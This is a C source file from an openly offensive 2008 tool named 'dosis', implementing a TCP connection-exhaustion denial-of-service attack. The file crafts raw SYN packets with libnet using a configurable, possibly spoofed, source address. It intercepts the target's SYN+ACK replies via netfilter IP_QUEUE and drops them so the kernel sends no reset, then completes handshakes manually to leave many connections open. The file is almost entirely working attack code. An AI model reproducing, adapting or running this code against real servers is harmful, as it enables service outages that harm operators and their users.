/*****************************************************************************
 * tcpopen.c
 *
 * DoS on TCP servers by leaving connections opened.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <libnet.h>
#include <libipq/libipq.h>

#include "dosis.h"
#include "tea.h"
#include "tcpopen.h"
#include "ipqex.h"
#include "pthreadex.h"
#include "log.h"

#define BUFSIZE    2048

typedef struct _tag_TCPOPEN_WORK {
  THREAD_WORK  *w;
  libnet_t     *ln;
  int           ipv4_p;
  int           tcp_p;
  int           ip_id;
  ipqex_msg_t   msg;
} TCPOPEN_WORK;

static ipqex_info_t        attack_tcpopen__ipq;
static pthreadex_flag_t    attack_flag;

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * SEND PACKET
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void send_packet(TCPOPEN_WORK *tw,
                        int flags, int window, int sport,
                        int seq, int ack,
                        char *data, int data_sz)
{
  int ip_size, tcp_size;

  DBG("[XX_%02u]   Send [D:%d, %d->%d; F:%x; %08x; %08x]",
      tw->w->id, data_sz, sport, opts.dport, flags, seq, ack);
  if(!data_sz)
    data = NULL;
  tcp_size = LIBNET_TCP_H + data_sz;
  ip_size  = LIBNET_IPV4_H + tcp_size;

  /* build TCP packet with payload (if requested) */
  tw->tcp_p =
    libnet_build_tcp(
      sport,                    /* source port                               */
      opts.dport,               /* destination port                          */
      seq,                      /* sequence number                           */
      ack,                      /* acknowledgement number                    */
      flags,                    /* control flags                             */
      window,                   /* window size                               */
      0,                        /* sum checksum (0 for libnet to autofill)   */
      0,                        /* urgent pointer                            */
      tcp_size,                 /* len total length of the TCP packet        */
      (unsigned char *) data,   /* payload                                   */
      data_sz,                  /* payload size                              */
      tw->ln,                   /* libnet context                            */
      tw->tcp_p);               /* protocol tag to modify an existing header */
  if(tw->tcp_p == -1)
    FAT("[XX_%02u]   Can't build TCP header: %s",
        tw->w->id, libnet_geterror(tw->ln));

  /* build container IP packet */
  tw->ipv4_p =
      libnet_build_ipv4(
        ip_size,           /* total length of packet (including data) */
        0x00,              /* type of service bits                    */
        tw->ip_id++,       /* IP identification number                */
        0x4000,            /* fragmentation bits and offset           */
        64,                /* time to live in the network             */
        IPPROTO_TCP,       /* upper layer protocol                    */
        0,                 /* checksum (0 for libnet to autofill)     */
        opts.shost.s_addr, /* source IPv4 address (little endian)     */
        opts.dhost.s_addr, /* tination IPv4 address (little endian)   */
        NULL,              /* payload                                 */
        0,                 /* payload length                          */
        tw->ln,            /* libnet context                          */
        tw->ipv4_p);       /* tag to modify an existing header        */
  if(tw->ipv4_p == -1)
    FAT("[XX_%02u]   Can't build IP header: %s",
        tw->w->id, libnet_geterror(tw->ln));

  /* send! */
  if(libnet_write(tw->ln) == -1)
    FAT("[XX_%02u]   Error sending packet: %s",
        tw->w->id, libnet_geterror(tw->ln));
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * LISTENER THREAD
 *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
 *   add more packages to the queue when we have to answer to some SYN+ACK
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void listener_thread(TCPOPEN_WORK *tw)
{
  int status, fport;

  /* filtering port */
  fport = htons(opts.dport);

  /* initialize pcap library */
  DBG("[LL_%02u] Initializing IPQ message...", tw->w->id);
  if(ipqex_msg_init(&(tw->msg), &attack_tcpopen__ipq))
    FAT("[LL_%02u] Cannot initialize IPQ message.", tw->w->id);

  /* listen the radio */
  while(!opts.finalize)
  {
    if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
    {
      if(status < 0)
        ERR("[LL_%02u] Error reading from IPQ: %s",
            tw->w->id, ipq_errstr());
    } else {
      /* but ... in some circumstances ... */
      if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
      && ipqex_get_ip_header(&(tw->msg))->daddr == opts.shost.s_addr
      && ipqex_get_tcp_header(&(tw->msg))->source == fport)
      {
        DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
        /*
        DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
                tw->w->id,
                ipqex_identify_ip_protocol(&(tw->msg)),
                (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
                (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
                (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
                (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
                ipqex_get_tcp_header(&(tw->msg))->dest, fport,
                ipqex_get_tcp_header(&(tw->msg))->rst,
                ipqex_get_ip_header(&(tw->msg))->saddr,
                opts.shost.s_addr);
        */

        /* ignore any packet that have anything to do with this connection */
        if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
          ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);

        /* in some special case (handshake) send kakitas */
        if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
        && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
        {
          /* send handshake and data TCP packet */
          DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
          send_packet(tw, TH_ACK,
                      ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                      ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
                      ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                      ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
                      NULL, 0);
          send_packet(tw, TH_ACK | TH_PUSH,
                      ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                      ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
                      ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                      ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
                      opts.req,
                      opts.req_size);
        }
      } else
        /* policy: accept anything unknown */
        if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
          ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * SENDER THREADS
 *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
 *   add more packages to the queue when we have to answer to some SYN+ACK
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void sender_thread(TCPOPEN_WORK *tw)
{
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int npackets, i;

  DBG("[SS_%02u] Started sender thread", tw->w->id);

  /* set how many packets will be sent by this thread */
  npackets = opts.packets / (opts.c - opts.l);
  if(tw->w->id == opts.c - 1)
    npackets += opts.packets - (npackets * (opts.c - opts.l));

  /* ATTACK */
  while(!opts.finalize)
  {
    /* wait for work */
    pthreadex_flag_wait(&attack_flag);

    /* build TCP packet with payload (if requested) */
    DBG("[SS_%02u] Sending %d packets...", tw->w->id, npackets);
    for(i = 0; i < npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      send_packet(tw, TH_SYN,
                  13337,
                  libnet_get_prand(LIBNET_PRu16),
                  seq, 0, NULL, 0);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GENERIC HHTP THREAD
 *   This thread specializes in different tasks depending on thread number
 *     0 - listener
 *     x - sender
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void attack_tcpopen__thread_cleanup(TCPOPEN_WORK *tw)
{
  /* collect libnet data */
  if(tw->ln)
    libnet_destroy(tw->ln);

  /* close ipq (if this is a listener thread) */
  if(tw->w->id < opts.l)
  {
    DBG("[MM_%02u] Freeing IPQ message...", tw->w->id);
    ipqex_msg_destroy(&(tw->msg));
  }

  DBG("[MM_%02u] Finalized.", tw->w->id);
}

static void attack_tcpopen__thread(THREAD_WORK *w)
{
  char lnet_errbuf[LIBNET_ERRBUF_SIZE];
  int r;
  TCPOPEN_WORK tw;

  /* initialize specialized work thread data */
  memset(&tw, 0, sizeof(tw));
  tw.w = w;

  /* initialize thread */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) attack_tcpopen__thread_cleanup, &tw);

  /* initialize libnet */
  DBG("[MM_%02u] Initializing libnet.", tw.w->id);
  if((tw.ln = libnet_init(LIBNET_RAW4, NULL, lnet_errbuf)) == NULL)
    FAT("[MM_%02u] Cannot initialize libnet: %s", tw.w->id, lnet_errbuf);
  tw.tcp_p = LIBNET_PTAG_INITIALIZER;
  tw.ipv4_p = LIBNET_PTAG_INITIALIZER;
  tw.ip_id = libnet_get_prand(LIBNET_PRu32);

  if(libnet_seed_prand(tw.ln) < 0)
    FAT("[MM_%02u] Faild to initialize libnet pseudorandom number generator.",
        tw.w->id);

  /* wait 4 start */
  pthreadex_barrier_wait(w->start);

  /* launch specialized thread */
  if(w->id < opts.l)
    listener_thread(&tw);
  else
    sender_thread(&tw);

  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GO4WORK
 *   Function to enqueue SYN packets.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int attack_tcpopen__go2work(void)
{
  return pthreadex_flag_up(&attack_flag);
}

void attack_tcpopen(void)
{
  /* initialize */
  DBG("Initializing IPQ...");
  if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
    FAT("  !! Cannot initialize IPQ.");

  /* flag that will keep attack threads waiting for work */
  pthreadex_flag_init(&attack_flag, 0);

  /* launch attack */
  tea_timer(attack_tcpopen__go2work, attack_tcpopen__thread);

  /* finalize ipq */
  ipqex_destroy(&attack_tcpopen__ipq);
}


